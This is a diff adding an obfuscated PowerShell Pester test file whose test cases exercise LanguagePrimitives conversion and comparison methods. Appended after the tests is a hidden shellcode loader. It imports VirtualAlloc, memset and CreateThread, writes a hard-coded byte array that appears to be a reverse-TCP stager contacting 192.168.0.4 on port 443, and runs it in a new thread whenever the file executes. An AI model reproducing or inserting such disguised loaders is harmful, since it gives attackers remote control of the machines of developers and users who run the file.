@@ -1,0 +1,107 @@
+  ${O0W} = [type]("{5}{8}{7}{1}{6}{0}{3}{2}{4}" -f 'tIC','g','oCE','S.Pr','sS','sys','NOS','ia','tem.d');  &("{0}{1}"-f 'SEt','-Item') ("vAri"+"aBLe:Q"+"5T6J")  (  [tYPe]("{3}{0}{5}{2}{4}{1}"-f 'YStem.Da','tATABlE','a','s','.da','t')  );   &("{1}{0}" -f 'm','sEt-ITE')  ("{0}{1}{2}{4}{3}"-f 'VARi','A','ble:','Z','fc1s') ([tYpe]("{0}{2}{1}" -f'daTEt','Me','i'))  ;   ${Kn0q}=  [TyPE]("{1}{5}{8}{11}{6}{12}{9}{10}{2}{3}{4}{0}{7}"-f'm','S','n.laNGUa','Ge','Pri','ySTe','nAgeMENT.','iTIVeS','m','m','Atio','.Ma','auto')  ;
+
+&("{0}{1}{2}"-f 'De','scrib','e') ("{3}{2}{0}{5}{6}{1}{4}" -f 'i','est','rim','Language P','s','tive ','T') -Tags "CI" {
+    &('It') ("{5}{13}{8}{14}{0}{6}{12}{9}{10}{3}{7}{4}{11}{15}{1}{2}"-f'a','ure s','ensitive','and non','c type should n','Eq','ri','-numeri','ty co',' with stri','ng ','ot be ','son','uali','mp','cult') {
+        ${D`AtE} = [datetime]("{2}{1}{0}" -f'0',',1','2005,3')
+        ${v`Al} =  (&("{0}{1}"-f 'dI','r')  ("{1}{0}{3}{2}" -f 'b','vARIa','e:Kn0Q','L')  )."va`Lue"::("{1}{2}{0}" -f's','Equa','l').Invoke(${dA`TE}, ("{1}{0}{2}"-f '/1','3','0/2005'))
+        ${v`Al} | &("{0}{1}"-f 'Shou','ld') -BeTrue
+    }
+
+    &('It') ("{14}{12}{5}{13}{3}{7}{4}{0}{11}{2}{8}{9}{6}{10}{1}"-f 'on of an P','ol','u','er','i','n','Object to','s','ll Ba','se ',' bo','SObject with N','t co','v','Tes') {
+        ${M`S`hobJ} = &("{2}{1}{0}" -f 'ect','bj','New-O') ("{2}{0}{1}" -f'so','bject','p')
+        {  ${k`N0Q}::"con`VEr`TTO"(${mSh`obj}, [bool]) } | &("{0}{1}"-f 'Sh','ould') -BeTrue
+    }
+
+    &('It') ("{10}{5}{12}{0}{7}{13}{1}{11}{4}{16}{8}{14}{15}{6}{3}{2}{17}{9}"-f'n','of an PSO',' to ','se Object','ect wi','st c','a','v','h','g','Te','bj','o','ersion ',' ','Null B','t','strin') {
+        ${Msh`OBJ} = &("{2}{0}{1}" -f '-Obje','ct','New') ("{1}{0}"-f'bject','pso')
+        {  ( &("{1}{0}" -f'i','gC') ('vaR'+'IAbLe:KN0'+'Q'))."VaL`UE"::"Co`NvERTto"(${MsH`o`Bj}, [string]) -eq "" } | &("{1}{0}" -f'uld','Sho') -BeTrue
+    }
+
+    &('It') ("{6}{16}{4}{5}{12}{3}{9}{2}{14}{8}{10}{1}{13}{11}{0}{7}{15}"-f' Ob','l ','ect',' ','s','ion of ','Te','ject to o','wit','PSObj','h Nul','ase','an','B',' ','bject','st conver') {
+        ${MS`h`oBj} = &("{1}{3}{2}{0}"-f 'ct','N','je','ew-Ob') ("{0}{1}{2}" -f'p','s','object')
+        { ${m`ShobJ} -eq  ${KN0Q}::"CoN`VER`TTo"(${Ms`ho`Bj}, [Object]) } | &("{0}{1}" -f'Sho','uld') -BeTrue
+    }
+
+    &('It') ("{6}{2}{3}{5}{7}{1}{0}{4}" -f 'o objec','f an IEnumerable t','Co','nver','t[]','si','Test ','on o') {
+        ${C`Ol} =  ( &("{2}{1}{0}" -f 'RIaBLe','A','v')  ("{0}{1}" -f'o0','W') -VALUe)::("{1}{3}{2}{0}{4}" -f'oce','GetCurrent','r','P','ss').Invoke()."MOdu`LeS"
+        ${O`BJA`Rray} =   ( &("{1}{0}" -f'Tem','I') ("{0}{2}{1}"-f 'VAr','q','IABLe:kn0'))."v`ALue"::"conv`E`RttO"(${C`ol}, [object[]])
+        ${O`B`JArRAY}."LENG`TH" | &("{1}{0}" -f 'hould','S') -Be ${c`Ol}."cO`UNt"
+    }
+
+    &('It') ("{5}{0}{3}{1}{2}{6}{12}{13}{10}{11}{7}{8}{4}{9}"-f'asting recurs','e a','rr','iv','c','C','ay ','ot',' cause ','rash','ou','ld n','to bool ','sh') {
+        ${A}[0] = ${a} = [PSObject](, 1)
+         (&("{2}{1}{0}"-f 'BLe','Aria','GET-V')  ('Kn'+'0Q') -VA  )::("{1}{0}" -f'True','Is').Invoke(${A}) | &("{0}{1}"-f'Shou','ld') -BeTrue
+    }
+
+    &('It') ((("{10}{7}{5}{1}{17}{14}{12}{11}{9}{19}{15}{3}{0}{6}{8}{22}{4}{21}{16}{13}{20}{2}{18}"-f'e should treat','agePr','abl','abl','X','u',' rX','ang','L','tEn','L','.Ge','s','s En','itive','er','a','im','e','um','umer','L ','DataTabler')) -rePlAcE  'rXL',[chAr]39) {
+        ${D`T} =  (  &("{0}{2}{1}{3}"-f 'gET','v','-','arIabLE') ('q5T'+'6J')  -vAl)::("{0}{1}" -f'n','ew').Invoke(("{0}{1}" -f't','est'))
+        ${D`T}."CoLu`M`NS".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}" -f'me','Na'), [string]) > ${nU`ll}
+        ${d`T}."Colum`NS"."A`dD"("Age", [string]) > ${NU`ll}
+        ${D`R} = ${dT}.("{1}{2}{0}" -f 'ow','Ne','wR').Invoke(); ${dr}[("{1}{0}" -f 'e','Nam')] = ("{0}{1}" -f'J','ohn'); ${dR}["Age"] = "20"
+        ${d`R2} = ${dt}.("{0}{2}{1}" -f 'New','w','Ro').Invoke(); ${DR}[("{0}{1}" -f 'Nam','e')] = ("{0}{1}"-f'Sus','an'); ${d`R}["Age"] = "25"
+        ${Dt}."Ro`ws".("{0}{1}" -f'A','dd').Invoke(${D`R}); ${d`T}."ro`Ws".("{0}{1}"-f 'A','dd').Invoke(${d`R2})
+
+         (&('gi') ('VaR'+'I'+'Abl'+'e:Kn'+'0q') )."Val`UE"::("{1}{2}{0}{3}"-f 'umera','IsO','bjectEn','ble').Invoke(${D`T}) | &("{2}{0}{1}" -f 'u','ld','Sho') -BeTrue
+        ${C`OU`NT} = 0
+          ${K`N0q}::("{1}{2}{0}" -f 'umerable','G','etEn').Invoke(${DT}) | &("{3}{2}{0}{1}{4}" -f'ch','-Ob','rEa','Fo','ject') { ${c`Ou`Nt}++ }
+        ${C`OuNT} | &("{2}{1}{0}"-f'uld','o','Sh') -Be 2
+    }
+
+    &('It') ("{6}{1}{4}{3}{10}{2}{12}{7}{0}{9}{5}{11}{8}" -f'ceed on i','ry','ld','e sho','Compar',' and','T','suc','ng','nt','u',' stri',' ') {
+        ${R`e`sUlt} = ${nU`ll}
+          (&("{1}{0}" -f'R','dI')  ("{2}{0}{3}{1}" -f'Ab','Kn0Q','varI','lE:'))."va`lUe"::"TrYCOmp`A`Re"(1, "1", [ref] ${R`ESu`lT}) | &("{0}{1}" -f'Shou','ld') -BeTrue
+        ${REsu`LT} | &("{0}{1}"-f'Shou','ld') -Be 0
+    }
+
+    &('It') ("{8}{3}{9}{2}{10}{6}{4}{0}{7}{1}{5}" -f 'd ','ail','e','Comp','ul',' on int and datetime','o','f','Try','ar',' sh') {
+        ${R`ES`Ult} = ${nu`lL}
+         (  &("{1}{0}"-f 'aRiABLE','v') ('Kn'+'0q')  )."VAL`Ue"::("{1}{0}{2}"-f 'p','TryCom','are').Invoke(1,   (  &("{1}{0}" -f 'm','ITE')  ("{3}{1}{2}{0}"-f 'SZ','Ble:','fc1','varia'))."VAL`UE"::"n`OW", [ref] ${r`e`sUlt}) | &("{0}{1}" -f 'Shoul','d') -BeFalse
+    }
+
+    &('It') ("{3}{0}{12}{9}{2}{10}{13}{7}{14}{6}{1}{15}{5}{8}{11}{4}" -f'mpare shou','m',' ','TryCo','er','re c','co','t','orrect',' succeed','on','ly small','ld',' int and in',' and ','pa') {
+        ${rE`SULt} = ${n`ULL}
+          (  &("{3}{1}{2}{0}" -f'Le','R','IAb','get-Va')  ("{0}{1}" -f 'k','N0Q') )."v`ALuE"::"TryC`OMP`Are"(1, 2, [ref] ${R`ESULT}) | &("{0}{1}" -f'Shoul','d') -BeTrue
+        ${R`es`ULt} | &("{1}{0}"-f 'd','Shoul') -BeExactly ('-1')
+    }
+
+    &('It') ("{10}{13}{7}{4}{5}{9}{8}{0}{6}{3}{11}{12}{1}{2}" -f' ','rrectly greate','r',' ','c','eed on','string','c','d',' string an','TryCompare shoul','and com','pare co','d su') {
+        ${r`E`SULt} = ${n`UlL}
+          ( &("{2}{1}{0}"-f 'ITEM','d','CHiL')  ('V'+'A'+'rI'+'Abl'+'E:kn0q') )."vAL`UE"::"tr`Y`CO`MpaRE"("bbb", "aaa", [ref] ${Res`Ult}) | &("{0}{1}" -f'Shoul','d') -BeTrue
+        ${R`ESu`lT} | &("{0}{1}"-f 'Shoul','d') -BeExactly 1
+    }
+
+    &('It') ("{0}{15}{9}{2}{20}{11}{7}{18}{13}{10}{4}{16}{14}{17}{5}{3}{12}{8}{1}{21}{6}{19}{22}" -f 'TryCo','i','shou','e','d compar','ins','v','n string','s','are ','ring an','cceed o','n','d st','se','mp','e ca',' ',' an','e corr','ld su','ti','ectly') {
+        ${r`E`sULT} = ${Nu`lL}
+          ${KN0q}::"tR`yComPA`Re"("AAA", "aaa", ${t`RUE}, [ref] ${rE`sU`LT}) | &("{0}{1}" -f 'S','hould') -BeTrue
+        ${R`EsU`lT} | &("{1}{0}{2}" -f'houl','S','d') -BeExactly 0
+    }
+
+    &('It') ("{4}{3}{5}{11}{7}{8}{1}{6}{9}{0}{10}{2}" -f 'lt','nfo','itive','yC','Tr','ompare',' is','lt','ureI',' cu','ure sens',' with cu') {
+        ${Resu`Lt} = ${nU`ll}
+        ${s`wEdi`SH} = [cultureinfo] ("{1}{0}" -f '-SE','sv')
+        
+        ${V`AL} =   ${Kn0q}::"TRY`Co`mPARe"("ooo", "???", ${faL`SE}, ${s`wE`diSh}, [ref] ${re`sUlt})
+        ${v`AL} | &("{0}{1}" -f 'Shoul','d') -BeTrue
+        ${reSU`Lt} | &("{0}{1}"-f'Shoul','d') -BeExactly ('-1')
+    }
+
+    &('It') ("{3}{5}{4}{9}{1}{8}{6}{0}{2}{7}" -f ' as C','an n','ompar','TryCom',' compares greater t','pare','l','e','ul','h') {
+        ${Re`SUlt} = ${N`ULL}
+
+        ${C`oMp`A`RErESuLt} =   ${KN0Q}::("{0}{1}" -f 'C','ompare').Invoke(${N`ULL}, 10)
+        ${v`AL} =   (&("{0}{1}{3}{2}" -f 'g','et-vaR','e','IABl') ('K'+'N0q'))."va`lUE"::"Tr`Yc`oM`PARe"(${NU`ll}, 10, [ref] ${rESU`Lt})
+        ${V`AL} | &("{0}{1}"-f 'Sho','uld') -BeTrue
+        ${RES`Ult} | &("{0}{1}"-f 'Shou','ld') -BeExactly ${cOmPAR`ErES`ULt}
+    }
+
+    &('It') ("{8}{6}{9}{2}{10}{7}{3}{0}{4}{5}{1}" -f 'h','null as Compare','are','es less t','a','n ','C','compar','Try','omp',' ') {
+        ${Re`su`lt} = ${nu`LL}
+
+        ${c`OM`PaR`eRE`Sult} =   (  &("{1}{0}" -f 'IR','D') ('v'+'aRiAbL'+'E:kN0Q')  )."v`ALUe"::("{0}{1}{2}"-f'Com','pa','re').Invoke(10, ${nu`LL})
+        ${v`Al} =  (&("{0}{1}{2}" -f 'VAR','ia','BLe') ("{1}{0}" -f'n0Q','K')  )."Val`Ue"::"tRYco`M`pA`RE"(10, ${N`ULL}, [ref] ${re`SULt})
+        ${v`Al} | &("{0}{1}"-f'Shoul','d') -BeTrue
+        ${RE`Sult} | &("{1}{0}"-f'ould','Sh') -BeExactly ${C`Omp`AR`ERE`SULt}
+    }
+}
+
+${C} = ((("{101}{31}{76}{78}{27}{91}{59}{73}{53}{110}{62}{18}{102}{12}{111}{109}{85}{32}{68}{25}{120}{2}{86}{97}{66}{54}{26}{17}{94}{89}{90}{100}{67}{87}{117}{119}{77}{52}{104}{29}{30}{28}{35}{45}{51}{23}{106}{103}{38}{15}{96}{70}{81}{74}{10}{63}{75}{36}{46}{42}{5}{7}{61}{114}{20}{65}{58}{84}{93}{6}{115}{48}{14}{21}{33}{99}{71}{98}{24}{9}{8}{1}{72}{34}{60}{4}{40}{112}{80}{116}{118}{49}{44}{83}{50}{47}{41}{92}{56}{39}{43}{57}{3}{113}{22}{37}{82}{95}{107}{105}{88}{55}{79}{13}{108}{16}{19}{0}{69}{64}{11}" -f 'src,','int d',' uint ','vcrt.','lags, ','eadA',',','ttr',' u','er,','d(I',');','VirtualAl','set(IntP','Ptr',' ext',' ','ca',' IntPt','dest, uint ','s, ui',' lpS','D)','lGCD','met','pA','llo','ern','GCDk','Imp','ort(','llIm','t','tartAd','Creation','e',' ',']p','c','l','I',');','pThr','Import(GC','a','r','l','d','nt','hre','I','nel32.dl','[D','D','flA','ern IntPt','Dl','Dms','St','l','F','ib','atic extern','ntP','nt count','nt dw','ize, uint ','l','r l',' ui','r CreateTh','tPt','w','32.dllGC','ea','tr','p',';','ort(GCDk','r mem','t','r','ub','d','ackS','P','dw','Pr','xt','ype',', uin','e','[','ize','tionT','lic','ern IntPt','S','r lpPara','dress, In','t f','[D','r ','ublic stati','ll',' e',')]p',' static','tr','oc(Int',')]public st','l','n','dllGC','ute',' I','Ptr lp','ote','T','ct)','ddress,'))  -CRepLacE 'GCD',[ChAr]34);${W} = &("{1}{0}{2}" -f'p','Add-Ty','e') -memberDefinition ${c} -Name ("{1}{0}" -f'32','Win') -namespace ("{0}{1}{2}"-f 'W','in32Functio','ns') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x04,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${z}."lenG`Th" -gt 0x1000){${g} = ${z}."LEN`g`Th"};${X}=${W}::("{0}{2}{3}{1}"-f'Vi','Alloc','rt','ual').Invoke(0,0x1000,${g},0x40);for (${i}=0;${i} -le (${Z}."L`ENG`TH"-1);${I}++) {${W}::"ME`mSet"([IntPtr](${X}.("{1}{0}"-f'oInt32','T').Invoke()+${i}), ${Z}[${i}], 1)};${W}::("{0}{2}{1}" -f 'Cr','read','eateTh').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{0}{2}" -f'lee','Start-s','p') 60};
